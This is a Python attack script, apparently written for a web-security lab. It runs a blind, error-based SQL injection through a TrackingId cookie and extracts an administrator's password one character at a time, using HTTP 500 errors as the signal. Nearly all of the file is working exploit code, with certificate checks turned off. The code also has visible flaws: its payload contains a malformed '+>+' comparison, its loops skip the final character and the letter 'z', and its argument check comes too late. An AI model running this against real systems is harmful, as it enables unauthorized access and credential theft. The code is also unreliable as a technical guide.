import sys
import urllib3
import requests
import urllib.parse


#proxies = {"http" : "http://127.0.0.1:8000","https" : "http://127.0.0.1:8000"}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # To avoid wornings

def validation (file_path):
    if len(sys.argv) < 2:
        print("[-] Learn how to use the script: %s <url> <password lenght> <TrackingID> <SessionID>" % sys.argv[0])
        exit(1)

    try:
        with open(file_path, 'r') as file:
            for line in file:
                # Strip whitespace and check for variable names
                line = line.strip()

                match line.split(":", 1):
                    case ["URL", value]:
                        url = value.strip()
                    case ["Passsword size", value]:
                        pass_len = value.strip()
                    case ["TrackingId", value]:
                        traking_id = value.strip()
                    case ["session", value]:
                        session_id = value.strip()
        
        return url, pass_len, traking_id, session_id

    except FileNotFoundError:
        print(f"Error: The file '{file_path}' does not exist.")
        exit(1)
    except Exception as e:
        print(f"An error occurred: {e}")
        exit(1)
    
    

def sqli_force_pass(data):
    pass_extracted = ""
    pass_len = int(data[1])
    for i in range(1,pass_len):
        for j in list(range(48,58)) + list(range(97,122)): #hexa for all chars and nums
            sql_payload = "'||(SELECT CASE WHEN SUBSTR(password,%s,1)+%s+'%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (i,'>',chr(j))
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId':data[2] + sql_payload_encoded,'session':data[3]}
            r = requests.get(data[0], cookies=cookies, verify=False)
            if r.status_code == 500 :
                pass_extracted += chr(j)
                sys.stderr.write("\r" + pass_extracted)
                sys.stderr.flush()
                break
            else:
                sys.stdout.write("\r" + pass_extracted + chr(j))
                sys.stdout.flush()
    
    print(pass_extracted)




if __name__ == "__main__":
    data = validation(sys.argv[1].strip())
    print("[+] Doing my best...")
    sqli_force_pass(data)
else: 
    print("Fuck")